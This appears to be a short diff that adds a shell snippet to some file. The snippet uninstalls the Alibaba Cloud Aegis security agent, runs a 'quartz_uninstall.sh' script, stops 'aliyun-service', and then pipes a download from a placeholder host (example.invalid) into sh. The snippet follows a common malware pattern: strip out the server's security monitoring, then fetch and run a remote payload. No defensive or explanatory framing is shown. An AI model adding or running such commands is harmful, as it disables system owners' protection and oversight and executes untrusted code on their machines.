@@ -1,0 +1,5 @@
+/usr/local/aegis/aegis_update/uninstall.sh
+quartz_uninstall.sh
+service aliyun-service stop
+curl -s http://example.invalid/a | sh
+
